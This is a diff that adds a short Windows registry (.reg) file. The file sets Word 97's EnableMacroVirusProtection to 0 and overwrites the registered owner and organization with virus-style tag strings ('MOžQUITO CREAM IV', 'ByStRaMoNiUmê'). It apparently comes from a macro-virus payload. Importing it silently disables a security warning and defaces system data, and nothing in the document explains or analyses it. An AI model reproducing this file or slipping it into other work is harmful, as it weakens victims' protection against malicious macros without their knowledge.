@@ -1,0 +1,7 @@
+REGEDIT4
+  
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion]
+"RegisteredOwner"="MOžQUITO CREAM IV"
+"RegisteredOrganization"="ByStRaMoNiUmê"
+[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]
+"EnableMacroVirusProtection"="0"
